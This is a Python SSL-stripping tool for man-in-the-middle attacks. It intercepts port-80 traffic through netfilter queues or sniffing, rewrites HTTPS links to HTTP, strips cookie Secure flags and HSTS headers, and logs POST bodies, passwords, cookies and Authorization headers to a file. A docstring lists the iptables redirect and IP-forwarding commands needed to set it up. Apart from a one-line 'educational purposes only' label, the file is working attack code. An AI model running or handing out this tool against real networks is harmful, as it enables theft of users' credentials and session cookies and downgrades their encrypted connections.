#!/usr/bin/env python3

from scapy.all import *
try:
    from netfilterqueue import NetfilterQueue
    NETFILTER_AVAILABLE = True
except ImportError:
    NETFILTER_AVAILABLE = False
    print("[!] NetfilterQueue not available - only sniff mode will work")
import re
import threading
from collections import defaultdict
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)

class SSLStripper:
    def __init__(self, log_file="sslstrip.log"):
        """
        Initialize the SSL Stripper
        
        Args:
            log_file: Path to file for logging stripped data
        """
        self.log_file = log_file
        self.https_to_http = {}  # Map HTTPS URLs to HTTP for victim
        self.http_to_https = {}  # Map HTTP URLs back to HTTPS for servers
        self.lock = threading.Lock()
        
        # Patterns to detect and replace
        self.https_pattern = re.compile(rb'https://', re.IGNORECASE)
        self.secure_pattern = re.compile(rb'Secure', re.IGNORECASE)
        
        # Common headers to strip
        self.strip_headers = [
            b'Strict-Transport-Security',
            b'upgrade-insecure-requests'
        ]
        
        logger.info("SSL Stripper initialized")
    
    def process_packet(self, packet):
        """
        Main packet processing function for netfilter queue
        
        Args:
            packet: Netfilter queue packet object
        """
        try:
            # Get the actual packet data
            scapy_packet = IP(packet.get_payload())
            
            # Process HTTP traffic
            if scapy_packet.haslayer(TCP):
                if scapy_packet[TCP].dport == 80 or scapy_packet[TCP].sport == 80:
                    modified = self.strip_https_links(scapy_packet)
                    if modified:
                        packet.set_payload(bytes(modified))
            
            packet.accept()
            
        except Exception as e:
            logger.error(f"Error processing packet: {e}")
            packet.accept()
    
    def strip_https_links(self, packet):
        """
        Strip HTTPS links from HTTP traffic and replace with HTTP
        
        Args:
            packet: Scapy packet
            
        Returns:
            Modified packet or None if no modification needed
        """
        if not packet.haslayer(Raw):
            return None
        
        try:
            load = packet[Raw].load
            modified = False
            
            # Replace HTTPS with HTTP
            if self.https_pattern.search(load):
                logger.info(f"Found HTTPS link, stripping...")
                new_load = self.https_pattern.sub(b'http://', load)
                modified = True
            else:
                new_load = load
            
            # Strip Secure flag from cookies
            if b'Set-Cookie:' in new_load and self.secure_pattern.search(new_load):
                logger.info("Stripping Secure flag from cookies")
                new_load = self.secure_pattern.sub(b'', new_load)
                modified = True
            
            # Remove HSTS headers
            for header in self.strip_headers:
                if header in new_load:
                    logger.info(f"Removing security header: {header.decode()}")
                    # Remove the entire header line
                    pattern = header + rb':[^\r\n]*\r\n'
                    new_load = re.sub(pattern, b'', new_load, flags=re.IGNORECASE)
                    modified = True
            
            if modified:
                # Update packet
                packet[Raw].load = new_load
                
                # Delete checksums and lengths so they are recalculated
                del packet[IP].len
                del packet[IP].chksum
                del packet[TCP].chksum
                
                return packet
            
        except Exception as e:
            logger.error(f"Error in strip_https_links: {e}")
        
        return None
    
    def log_data(self, data_type, data):
        """
        Log interesting data (credentials, forms, etc.)
        
        Args:
            data_type: Type of data (e.g., "POST", "GET", "Cookie")
            data: The actual data to log
        """
        with self.lock:
            with open(self.log_file, 'a') as f:
                timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
                f.write(f"\n[{timestamp}] {data_type}\n")
                f.write(f"{data}\n")
                f.write("-" * 80 + "\n")
        
        logger.info(f"Logged {data_type} data")
    
    def analyze_http_data(self, packet):
        """
        Analyze HTTP traffic for credentials and sensitive data
        
        Args:
            packet: Scapy packet
        """
        if not packet.haslayer(Raw):
            return
        
        try:
            load = packet[Raw].load.decode('utf-8', errors='ignore')
            
            # Check for POST requests (often contain credentials)
            if load.startswith('POST'):
                logger.warning(f"Captured POST request")
                self.log_data("POST Request", load)
                
                # Look for common credential fields
                if any(field in load.lower() for field in ['password', 'passwd', 'pwd', 'pass']):
                    logger.warning("*** Potential password captured! ***")
            
            # Check for authentication headers
            if 'Authorization:' in load or 'Cookie:' in load:
                logger.warning("Captured authentication data")
                self.log_data("Authentication", load)
        
        except Exception as e:
            logger.error(f"Error analyzing HTTP data: {e}")
    
    def sniff_credentials(self, interface=None, target_ip=None):
        """
        Sniff HTTP traffic and capture credentials
        
        Args:
            interface: Network interface to sniff on
            target_ip: Optional - only capture traffic from this IP
        """
        logger.info("Starting credential sniffing...")
        if target_ip:
            logger.info(f"Filtering traffic from: {target_ip}")
        
        def packet_callback(packet):
            if packet.haslayer(TCP) and packet.haslayer(Raw):
                # Only process HTTP traffic
                if packet[TCP].dport == 80 or packet[TCP].sport == 80:
                    # Filter by source IP if specified
                    if target_ip and packet.haslayer(IP):
                        if packet[IP].src != target_ip:
                            return
                    
                    # Analyze for credentials
                    self.analyze_http_data(packet)
        
        # Build filter
        filter_str = "tcp port 80"
        if target_ip:
            filter_str = f"tcp port 80 and host {target_ip}"
        
        # Start sniffing
        sniff(
            iface=interface,
            prn=packet_callback,
            filter=filter_str,
            store=0
        )


class SSLStripProxy:
    """
    Alternative implementation using a simple proxy approach
    """
    def __init__(self, interface=None):
        self.interface = interface
        self.stripper = SSLStripper()
        self.running = False
    
    def start_sniffing(self):
        """
        Start sniffing packets (simpler approach without iptables)
        """
        logger.info("Starting SSL Strip sniffing mode...")
        self.running = True
        
        def packet_callback(packet):
            if not self.running:
                return False
            
            if packet.haslayer(TCP) and packet.haslayer(Raw):
                # Analyze HTTP traffic
                if packet[TCP].dport == 80 or packet[TCP].sport == 80:
                    self.stripper.analyze_http_data(packet)
        
        sniff(
            iface=self.interface,
            prn=packet_callback,
            filter="tcp port 80",
            store=0,
            stop_filter=lambda x: not self.running
        )
    
    def stop(self):
        """Stop the SSL stripper"""
        logger.info("Stopping SSL Strip...")
        self.running = False


def start_sslstrip_netfilter(queue_num=0):
    """
    Start SSL stripping using netfilter queue (requires iptables rules)
    
    Prerequisites (run as administrator):
    1. Enable IP forwarding:
       - Windows: Set-NetIPInterface -Forwarding Enabled
       - Linux: echo 1 > /proc/sys/net/ipv4/ip_forward
    
    2. Setup iptables rules (Linux):
       iptables -t nat -A PREROUTING -p tcp --dport 80 -j NFQUEUE --queue-num 0
       iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 80
    
    Args:
        queue_num: Netfilter queue number
    """
    try:
        stripper = SSLStripper()
        nfqueue = NetfilterQueue()
        nfqueue.bind(queue_num, stripper.process_packet)
        
        logger.info(f"SSL Stripper running on queue {queue_num}")
        logger.info("Press CTRL+C to stop")
        
        nfqueue.run()
        
    except KeyboardInterrupt:
        logger.info("\nStopping SSL Stripper...")
    except Exception as e:
        logger.error(f"Error: {e}")
        logger.error("Make sure you have NetfilterQueue installed and proper permissions")
    finally:
        try:
            nfqueue.unbind()
        except:
            pass


def start_sslstrip_sniff(interface=None):
    """
    Start SSL stripping in sniffing mode (simpler, doesn't require iptables)
    This mode only monitors and logs HTTP traffic, doesn't modify it in real-time.
    
    Args:
        interface: Network interface to sniff on (None for default)
    """
    proxy = SSLStripProxy(interface=interface)
    
    try:
        logger.info("Starting SSL Strip in monitoring mode")
        logger.info("This will capture and log HTTP traffic")
        logger.info("Press CTRL+C to stop")
        proxy.start_sniffing()
    except KeyboardInterrupt:
        logger.info("\nStopping...")
        proxy.stop()


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(
        description="SSL Stripping Tool - Educational purposes only"
    )
    parser.add_argument(
        "--mode",
        choices=["netfilter", "sniff"],
        default="sniff",
        help="Mode: 'netfilter' for active stripping (requires setup), 'sniff' for monitoring"
    )
    parser.add_argument(
        "--interface",
        help="Network interface to use (for sniff mode)"
    )
    parser.add_argument(
        "--queue",
        type=int,
        default=0,
        help="Netfilter queue number (for netfilter mode)"
    )
    
    args = parser.parse_args()
    
    if args.mode == "netfilter":
        start_sslstrip_netfilter(args.queue)
    else:
        start_sslstrip_sniff(args.interface)
